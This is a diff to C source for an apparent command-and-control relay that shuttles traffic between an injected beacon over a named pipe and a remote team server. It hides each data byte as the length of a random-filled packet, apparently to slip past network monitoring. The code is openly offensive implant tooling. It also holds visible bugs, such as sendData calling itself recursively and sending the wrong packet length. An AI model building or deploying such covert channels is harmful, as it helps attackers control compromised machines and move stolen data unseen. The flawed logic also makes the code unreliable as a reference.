@@ -90,6 +90,51 @@ SOCKET create_socket(char* ip, char* port)
 }
 
 
+
+/**
+ *  This function decodes a packet's length into a byte.
+ *  @param payload: the string to decode the length of.
+ *  @return length(payload) % 256 if length(payload) % 256 > 128,
+ *          (length(payload) % 256) +  128 otherwise.
+ */ 
+unsigned char decode_length(char* payload) {
+    unsigned char payload_length = (unsigned char)(strlen(payload) % 256);
+    return payload_length;
+}
+
+
+/**
+ *  This function encodes a byte into a string of appropriate length.
+ *  @param byte: the byte to encode into the length of the string.
+ *  @return a pointer to the head of the payload string of appropriate length.
+ */ 
+char* encode_length(unsigned char byte) {
+	unsigned int length = (int) byte;
+	if (length <= 128) {
+        length  += 128;
+    }
+    char* payload_str = malloc(512);
+    unsigned int i = 0;
+    for (i = 0; i < length; i++) {
+        *(payload_str + i) = (rand() % 256);    //TODO - seed the random number table
+    }
+    return payload_str;
+}
+
+/**
+ *  This function generates a 100-byte end transmission string.
+ *  @return a pointer to the head of the 100-byte end transmission string.
+ */ 
+char* encode_end_transmission() {
+    char* payload_str = malloc(100);
+    unsigned char i = 0;
+    for (i = 0; i < 100; i++) {
+        *(payload_str + i) = (rand() % 256);    //TODO - seed the random number table
+    }
+    return payload_str;
+}
+
+
 /**
  * Sends data to server received from our injected beacon
  *
@@ -98,8 +143,21 @@ SOCKET create_socket(char* ip, char* port)
  * @param len Length of data to send
 */
 void sendData(SOCKET sd, const char* data, DWORD len) {
-	send(sd, (char *)&len, 4, 0);
-	send(sd, data, len, 0);
+	
+		DWORD byte_counter = 0;
+		unsigned char byte = 0;
+		char* random_line = NULL;
+		for (byte_counter = 0; byte_counter < len; byte_counter++) {
+			byte = (unsigned char) data[byte_counter];
+			random_line = encode_length(byte);
+			send(sd, random_line, len, 0);
+			free(random_line);
+		}
+		
+		//Send "End Transmission" 100 byte packet
+		random_line = encode_end_transmission();
+		sendData(sd, random_line, 100);
+		free(random_line);
 }
 
 
@@ -108,23 +166,33 @@ void sendData(SOCKET sd, const char* data, DWORD len) {
  *
  * @param sd The socket file descriptor
  * @param buffer Buffer to store data in
- * @param max unused
+ * @param max full size of allocated buffer
  * @return Size of data recieved
+ * @pre buffer points to an allocated memory region of size max
+ * @post buffer contains the data recieved from the team server and no other data
 */
 DWORD recvData(SOCKET sd, char * buffer, DWORD max) {
-	DWORD size = 0, total = 0, temp = 0;
+	memset(buffer, 0, max);
+	char* random_line = malloc(512);
+	DWORD size = 0, total = 0;
 
-	/* read the 4-byte length */
-	/* TODO - will this cause endian issues? */
-	recv(sd, (char *)&size, 4, 0);
+	size = recv(sd, random_line, 512, 0);
 
-	/* read in the result */
-	while (total < size) {
-		temp = recv(sd, buffer + total, size - total, 0);
-		total += temp;
-	}
+	while (size != 100 && total < max) {
+			if (size < 0)
+			{
+				printf("recvData error, exiting\n");
+				break;
+			}
+			buffer[total] = decode_length(random_line); //TODO - this is a touch inefficient. Maybe change it to just work with read_size?
+			total++;
+			memset(random_line, 0, 512);
+			size = recv(sd, random_line, 512, 0);
+			
+		}
+	free(random_line);
 
-	return size;
+	return total;
 }
 
 
@@ -166,48 +234,6 @@ void write_frame(HANDLE smb_handle, char * buffer, DWORD length) {
 
 
 
-/**
- *  This function decodes a packet's length into a byte.
- *  @param payload: the string to decode the length of.
- *  @return length(payload) % 256 if length(payload) % 256 > 128,
- *          (length(payload) % 256) +  128 otherwise.
- */ 
-unsigned char decode_length(char* payload) {
-    unsigned char payload_length = (unsigned char)(strlen(payload) % 256);
-    return payload_length;
-}
-
-
-/**
- *  This function encodes a byte into a string of appropriate length.
- *  @param byte: the byte to encode into the length of the string.
- *  @return a pointer to the head of the payload string of appropriate length.
- */ 
-char* encode_length(unsigned char byte) {
-	unsigned int length = (int) byte;
-	if (length <= 128) {
-        length  += 128;
-    }
-    char* payload_str = malloc(length);
-    unsigned int i = 0;
-    for (i = 0; i < length; i++) {
-        *(payload_str + i) = (rand() % 256);    //TODO - seed the random number table
-    }
-    return payload_str;
-}
-
-/**
- *  This function generates a 100-byte end transmission string.
- *  @return a pointer to the head of the 100-byte end transmission string.
- */ 
-char* encode_end_transmission() {
-    char* payload_str = malloc(100);
-    unsigned char i = 0;
-    for (i = 0; i < 100; i++) {
-        *(payload_str + i) = (rand() % 256);    //TODO - seed the random number table
-    }
-    return payload_str;
-}
 
 
 
@@ -274,17 +300,11 @@ void main(int argc, char* argv[])
 	//Receive initial payload data
 	printf("Recieving initial payload data");
 	DWORD read_size = recvData(sockfd, random_line, 512);
-	while (read_size != 100 && byte_counter < BUFFER_MAX_SIZE) {
-		if (read_size < 0)
-		{
-			printf("recvData error, exiting\n");
-			break; //TODO - free and exit
-		}
-		payload[byte_counter] = decode_length(random_line); //TODO - this is a touch inefficient. Maybe change it to just work with read_size?
-		byte_counter++;
-		memset(random_line, 0, 512);
-		read_size = recvData(sockfd, random_line, 512);
-		
+	if (read_size < 0) 
+	{
+		printf("recvData error, exiting\n");
+		free(payload);
+		exit(1);
 	}
 
 	printf("Recv %d byte payload from TS\n", byte_counter);
@@ -322,8 +342,7 @@ void main(int argc, char* argv[])
 
 	// The pipe dance
 	while (1) {
-		byte_counter = 0;
-		byte = 0;
+
 		// Read frame
 		DWORD read_size = read_frame(beaconPipe, buffer, BUFFER_MAX_SIZE);
 		if (read_size < 0)
@@ -334,43 +353,17 @@ void main(int argc, char* argv[])
 
 		//Send data to receiver, 1 byte per packet
 		printf("Recv %d bytes from beacon\n", read_size);
-		for (byte_counter = 0; byte_counter < read_size; byte_counter++) {
-			byte = (unsigned char) *(buffer + byte_counter);
-			random_line = encode_length(byte);
-			sendData(sockfd, random_line, (DWORD) byte);
-			free(random_line);
-		}
-		
-		//Send "End Transmission" 100 byte packet
-		random_line = encode_end_transmission();
-		sendData(sockfd, random_line, 100);
-		free(random_line);
+
 
 		printf("Sent to TS\n");
 		
 
-		//Allocate space for random line
-		random_line = malloc(512*sizeof(unsigned char));
-		byte_counter = 0;
-		byte = 0;
-
 		//Read in data from server. 
-		read_size = recvData(sockfd, random_line, 512);
-		while (read_size != 100 && byte_counter < BUFFER_MAX_SIZE) {
-			if (read_size < 0)
-			{
-				printf("recvData error, exiting\n");
-				break;
-			}
-			buffer[byte_counter] = decode_length(random_line); //TODO - this is a touch inefficient. Maybe change it to just work with read_size?
-			byte_counter++;
-			memset(random_line, 0, 512);
-			read_size = recvData(sockfd, random_line, BUFFER_MAX_SIZE);
-			
-		}
-		printf("Recv %d bytes from TS\n", byte_counter);
+		read_size = recvData(sockfd, buffer, BUFFER_MAX_SIZE);
+		
+		printf("Recv %d bytes from TS\n", read_size);
 		free(random_line);
-		write_frame(beaconPipe, buffer, byte_counter);
+		write_frame(beaconPipe, buffer, read_size);
 		printf("Sent to beacon\n");
 	}
 	//Free all allocated memory and close all memory leaks 
